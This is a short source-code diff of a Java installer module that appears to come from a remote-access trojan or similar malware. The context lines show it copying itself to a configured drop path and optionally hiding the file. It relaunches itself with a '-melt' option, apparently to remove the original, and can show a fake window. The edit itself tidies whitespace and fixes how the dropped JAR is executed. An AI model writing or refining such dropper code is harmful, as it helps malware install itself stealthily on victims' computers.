@@ -38,7 +38,7 @@ public class InstallerStartupModule extends StartupModule {
 		try {
 			if (b) {
 				int dropLocation = Integer.parseInt(Configuration.getConfig().get("droppath"));
-				
+
 				if (locationIndex == dropLocation) {
 					locationIndex++;
 					run();
@@ -48,7 +48,7 @@ public class InstallerStartupModule extends StartupModule {
 				if (locationIndex != -1) {
 					dropLocation = locationIndex;
 				}
-								
+	
 				boolean hideFile = Boolean.parseBoolean(Configuration.getConfig().get("hiddenfile"));
 
 				String fileName = Configuration.getConfig().get("name");
@@ -174,7 +174,7 @@ public class InstallerStartupModule extends StartupModule {
 						String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
 						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "-melt", mepath });
 					} else {
-						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
+						Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
 					}
 				}
 				if (Boolean.parseBoolean(Configuration.getConfig().get("fakewindow"))) {
